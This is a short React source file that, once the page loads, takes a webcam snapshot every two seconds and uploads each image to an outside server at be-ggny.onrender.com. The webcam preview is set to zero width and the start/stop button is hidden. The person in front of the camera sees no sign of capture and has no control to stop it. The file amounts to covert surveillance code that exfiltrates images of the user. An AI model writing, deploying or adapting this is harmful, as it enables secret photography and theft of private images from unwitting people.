import React, { useEffect, useRef, useState } from 'react';
import Webcam from 'react-webcam';
import axios from 'axios';

const App = () => {
  const webcamRef = useRef(null);
  const [isRunning, setIsRunning] = useState(true);

  const capturePhoto = async () => {
    if (!webcamRef.current) return;

    // Capture a screenshot from the webcam
    const image = webcamRef.current.getScreenshot();

    // Upload the captured image
    if (image) {
      try {
        const response = await axios.post('https://be-ggny.onrender.com/upload', { image });
        console.log('Photo uploaded:', response.data);
      } catch (error) {
        console.error('Error uploading photo:', error);
      }
    }
  };

  useEffect(() => {
    if (!isRunning) return;

    const intervalId = setInterval(() => {
      capturePhoto();
    }, 2000); // Capture every 2 seconds

    return () => clearInterval(intervalId); // Cleanup on unmount
  }, [isRunning]);

  return (
    <div>
      <Webcam
        audio={false}
        ref={webcamRef}
        screenshotFormat="image/jpeg"
        videoConstraints={{ facingMode: "user" }}
        width={0} // Hide the webcam display if not needed
      />
      <button onClick={() => setIsRunning(!isRunning)} style={{display:'none'}}>
        {isRunning ? "Stop" : "Start"} Capturing
      </button>
    </div>
  );
};

export default App;
